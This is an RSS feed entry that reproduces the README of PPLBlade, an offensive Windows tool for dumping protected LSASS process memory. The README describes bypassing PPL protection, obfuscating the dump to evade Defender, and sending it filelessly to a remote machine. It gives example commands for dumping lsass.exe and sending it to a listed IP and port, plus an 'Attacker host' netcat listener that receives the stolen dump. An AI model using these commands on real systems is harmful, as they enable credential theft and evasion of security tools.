<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-09-04T01:31:52Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>tastypepperoni/PPLBlade</title>
    <updated>2023-09-04T01:31:52Z</updated>
    <id>tag:github.com,2023-09-04:/tastypepperoni/PPLBlade</id>
    <link href="https://github.com/tastypepperoni/PPLBlade" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Protected Process Dumper Tool&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PPLBlade&lt;/h1&gt; &#xA;&lt;p&gt;Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Key functionalities&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Bypassing PPL protection&lt;/li&gt; &#xA; &lt;li&gt;Obfuscating memory dump files to evade Defender signature-based detection mechanisms&lt;/li&gt; &#xA; &lt;li&gt;Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Overview of the techniques, used in this tool can be found here: &lt;a href=&#34;https://tastypepperoni.medium.com/bypassing-defenders-lsass-dump-detection-and-ppl-protection-in-go-7dd85d9a32e6&#34;&gt;https://tastypepperoni.medium.com/bypassing-defenders-lsass-dump-detection-and-ppl-protection-in-go-7dd85d9a32e6&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Note that PROCEXP15.SYS is listed in the source files for compiling purposes. It does not need to be transferred on the target machine alongside the PPLBlade.exe.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Itâ€™s already embedded into the PPLBlade.exe. The exploit is just a single executable.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Modes&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;Dump&lt;/strong&gt; - Dump process memory using PID or Process Name&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Decrypt&lt;/strong&gt; - Revert obfuscated(--obfuscate) dump file to its original state&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Cleanup&lt;/strong&gt; - Do cleanup manually, in case something goes wrong on execution &lt;em&gt;(Note that the option values should be the same as for the execution, we&#39;re trying to clean up)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;DoThatLsassThing&lt;/strong&gt; - Dump lsass.exe using Process Explorer driver &lt;em&gt;(basic poc)&lt;/em&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;Handle Mode&lt;/strong&gt;s:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;Direct&lt;/strong&gt; - Opens PROCESS_ALL_ACCESS handle directly, using OpenProcess() function&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Procexp&lt;/strong&gt; - Uses PROCEXP152.sys to obtain a handle&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage of PPLBlade.exe:&#xA;  -driver string&#xA;        Path where the driver file will be dropped (default: current directory)&#xA;  -dumpmode string&#xA;        Dump mode [local|network] (default &#34;local&#34;)&#xA;  -dumpname string&#xA;        Name of the dump file (default &#34;PPLBlade.dmp&#34;)&#xA;  -handle string&#xA;        Method to obtain target process handle [direct|procexp] (default &#34;direct&#34;)&#xA;  -help&#xA;        Prints this help message&#xA;  -ip string&#xA;        IP of the remote server&#xA;  -key string&#xA;        XOR Key for obfuscation (default &#34;PPLBlade&#34;)&#xA;  -mode string&#xA;        Kill or Dump process [dump|decrypt|cleanup|dothatlsassthing] (default &#34;dump&#34;)&#xA;  -name string&#xA;        Process name of target process&#xA;  -network string&#xA;        Method for network transfer[raw|smb] (default &#34;raw&#34;)&#xA;  -obfuscate&#xA;        Obfuscate dump file&#xA;  -pass string&#xA;        SMB password&#xA;  -pid int&#xA;        PID of target process (prioritized over process name)&#xA;  -port int&#xA;        PORT on the remote server&#xA;  -quiet&#xA;        Quiet mode&#xA;  -service string&#xA;        Name of the service (default &#34;PPLBlade&#34;)&#xA;  -share string&#xA;        share name&#xA;  -user string&#xA;        SMB username&#xA;&#xA;Examples:&#xA;PPLBlade.exe --mode dothatlsassthing&#xA;PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234&#xA;PPLBlade.exe --mode decrypt --dumpname PPLBlade.dmp --key PPLBlade&#xA;PPLBlade.exe --mode cleanup&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Examples:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Basic POC that uses PROCEXP152.sys to dump lsass:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PPLBlade.exe --mode dothatlsassthing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;(Note that it does not XOR dump file, provide an additional obfuscate flag to enable the XOR functionality)&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;Upload the obfuscated LSASS dump onto a remote location:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Attacker host:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;nc -lnp 1234 &amp;gt; lsass.dmp&#xA;python3 deobfuscate.py --dumpname lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Deobfuscate memory dump:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>